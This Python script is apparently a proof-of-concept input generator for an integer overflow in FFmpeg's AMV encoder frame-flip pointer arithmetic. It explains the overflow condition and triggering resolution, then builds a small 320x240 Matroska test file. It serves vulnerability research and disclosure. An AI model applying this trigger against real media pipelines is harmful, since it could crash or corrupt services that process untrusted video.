#!/usr/bin/env python3
"""
VULN-001 PoC Generator: AMV Encoder Integer Overflow in Frame Flip Pointer Arithmetic
File: libavcodec/mjpegenc.c, amv_encode_picture(), lines 636-638

Overflow condition:
    pic->data[i] += pic->linesize[i] * (vsample * s->c.height / V_MAX - 1);
    For luma (i=0): vsample=2, V_MAX=2, factor = height - 1
    linesize[0] * (height - 1) overflows int32 when linesize * height > INT_MAX

Minimum triggering resolution: ~46352x46352
    46352 * 46351 = 2,148,296,752 > INT_MAX (2,147,483,647)

NOTE: The actual overflow trigger uses -f lavfi in the shell script to avoid
embedding a ~3.2GB frame in an MKV file. This gen.py creates a small 320x240
MKV for reference/fallback use.
"""
import struct
import os


def ebml_vint(n):
    """Encode n as EBML variable-length integer (for sizes)."""
    if n < 0x7F:
        return bytes([n | 0x80])
    elif n < 0x3FFF:
        return struct.pack('>H', n | 0x4000)
    elif n < 0x1FFFFF:
        v = n | 0x200000
        return bytes([(v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF])
    elif n < 0x0FFFFFFF:
        return struct.pack('>I', n | 0x10000000)
    else:
        # Unknown / unbounded size sentinel
        return b'\x01\xFF\xFF\xFF\xFF\xFF\xFF\xFF'


def ebml_elem(eid, data):
    """Build an EBML element: ID bytes + VINT size + data."""
    if isinstance(data, str):
        data = data.encode('utf-8')
    elif isinstance(data, int):
        # Pack as minimal big-endian unsigned int
        if data == 0:
            data = b'\x00'
        else:
            length = (data.bit_length() + 7) // 8
            data = data.to_bytes(length, 'big')
    return eid + ebml_vint(len(data)) + data


def uint_be(n, size):
    return n.to_bytes(size, 'big')


def bitmapinfoheader(width, height, fourcc, bpp):
    """Create a 40-byte BITMAPINFOHEADER."""
    image_size = width * height * bpp // 8
    return struct.pack('<IiiHHIIiiII',
                       40,          # biSize
                       width,       # biWidth
                       height,      # biHeight
                       1,           # biPlanes
                       bpp,         # biBitCount
                       fourcc,      # biCompression (FOURCC)
                       image_size,  # biSizeImage
                       0, 0, 0, 0)  # pels/meter, clr fields


def create_mkv(width, height, output_path):
    """
    Create a minimal Matroska file with one YUY2 frame at width x height.
    YUY2 FOURCC = 0x32595559 ('YUY2').
    Frame data is all zeros (black frame).
    """
    YUY2_FOURCC = 0x32595559

    # EBML element IDs
    EBML_HDR     = b'\x1A\x45\xDF\xA3'
    SEGMENT      = b'\x18\x53\x80\x67'
    INFO         = b'\x15\x49\xA9\x66'
    TRACKS       = b'\x16\x54\xAE\x6B'
    TRACK_ENTRY  = b'\xAE'
    CLUSTER      = b'\x1F\x43\xB6\x75'

    # EBML header sub-elements
    EBML_VERSION     = b'\x42\x86'
    EBML_RD_VERSION  = b'\x42\xF7'
    EBML_MAX_ID_LEN  = b'\x42\xF2'
    EBML_MAX_SZ_LEN  = b'\x42\xF3'
    DOCTYPE          = b'\x42\x82'
    DOCTYPE_VERSION  = b'\x42\x87'
    DOCTYPE_RD_VER   = b'\x42\x85'

    # Track sub-elements
    TRACK_NUMBER  = b'\xD7'
    TRACK_UID     = b'\x73\xC5'
    TRACK_TYPE    = b'\x83'
    CODEC_ID      = b'\x86'
    CODEC_PRIVATE = b'\x63\xA2'
    VIDEO_ELEM    = b'\xE0'
    PIXEL_WIDTH   = b'\xB0'
    PIXEL_HEIGHT  = b'\xBA'

    # Info sub-elements
    TIMESTAMP_SCALE = b'\x2A\xD7\xB1'
    MUXING_APP      = b'\x4D\x80'
    WRITING_APP     = b'\x57\x41'

    # Cluster sub-elements
    TIMESTAMP    = b'\xE7'
    SIMPLE_BLOCK = b'\xA3'

    # Build EBML header
    ebml_header = (
        ebml_elem(EBML_VERSION,    uint_be(1, 1)) +
        ebml_elem(EBML_RD_VERSION, uint_be(1, 1)) +
        ebml_elem(EBML_MAX_ID_LEN, uint_be(4, 1)) +
        ebml_elem(EBML_MAX_SZ_LEN, uint_be(8, 1)) +
        ebml_elem(DOCTYPE,         'matroska') +
        ebml_elem(DOCTYPE_VERSION, uint_be(4, 1)) +
        ebml_elem(DOCTYPE_RD_VER,  uint_be(2, 1))
    )

    # Build Info element
    info_data = (
        ebml_elem(TIMESTAMP_SCALE, uint_be(1000000, 4)) +  # 1 ms per tick
        ebml_elem(MUXING_APP,  'vuln-001-poc-gen') +
        ebml_elem(WRITING_APP, 'vuln-001-poc-gen')
    )

    # Build Video element
    video_data = (
        ebml_elem(PIXEL_WIDTH,  uint_be(width,  2)) +
        ebml_elem(PIXEL_HEIGHT, uint_be(height, 2))
    )

    # Build TrackEntry
    codec_priv = bitmapinfoheader(width, height, YUY2_FOURCC, 16)
    track_entry_data = (
        ebml_elem(TRACK_NUMBER,  uint_be(1, 1)) +
        ebml_elem(TRACK_UID,     uint_be(0xDEADBEEF, 4)) +
        ebml_elem(TRACK_TYPE,    uint_be(1, 1)) +     # 1 = video
        ebml_elem(CODEC_ID,      'V_MS/VFM/FOURCC') +
        ebml_elem(CODEC_PRIVATE, codec_priv) +
        ebml_elem(VIDEO_ELEM,    video_data)
    )

    # Build Tracks element
    tracks_data = ebml_elem(TRACK_ENTRY, track_entry_data)

    # Build one black YUY2 frame
    frame_bytes = bytes(width * height * 2)  # YUY2: 2 bytes per pixel

    # SimpleBlock = TrackNumber VINT + 16-bit timecode + flags + frame data
    simple_block_payload = (
        bytes([0x81]) +              # Track 1 encoded as VINT (1 | 0x80)
        struct.pack('>H', 0) +       # timecode relative to cluster = 0
        bytes([0x80]) +              # flags: keyframe
        frame_bytes
    )

    # Build Cluster
    cluster_data = (
        ebml_elem(TIMESTAMP,    uint_be(0, 1)) +
        ebml_elem(SIMPLE_BLOCK, simple_block_payload)
    )

    # Assemble Segment contents
    segment_payload = (
        ebml_elem(INFO,    info_data) +
        ebml_elem(TRACKS,  tracks_data) +
        ebml_elem(CLUSTER, cluster_data)
    )

    # Use unknown/unbounded size for Segment (standard practice)
    mkv_bytes = (
        ebml_elem(EBML_HDR, ebml_header) +
        SEGMENT + b'\x01\xFF\xFF\xFF\xFF\xFF\xFF\xFF' + segment_payload
    )

    with open(output_path, 'wb') as f:
        f.write(mkv_bytes)

    print(f"[gen] Created {output_path} ({len(mkv_bytes)} bytes, {width}x{height} YUY2)")


if __name__ == '__main__':
    script_dir = os.path.dirname(os.path.abspath(__file__))
    out = os.path.join(script_dir, 'vuln_001_input.mkv')
    # Small reference frame — overflow is triggered via lavfi at large resolution
    create_mkv(320, 240, out)
